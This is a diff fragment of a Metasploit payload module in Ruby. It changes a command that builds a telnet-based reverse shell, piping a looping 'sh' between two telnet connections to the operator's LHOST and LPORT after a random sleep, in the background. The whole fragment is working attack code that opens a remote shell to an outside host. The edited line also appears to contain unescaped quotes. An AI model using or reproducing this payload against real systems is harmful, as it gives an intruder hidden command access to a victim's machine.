@@ -54,7 +54,7 @@ module Metasploit3
 		cmd =
 			"sh -c '(sleep #{3600+rand(1024)}|" +
 			"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
-			"while : ; do sh && break; done 2>&1|" +
+			"while : ; do sh && echo "\$ " && break; done 2>&1|" +
 			"telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
 			" >/dev/null 2>&1 &)'"
 		return cmd
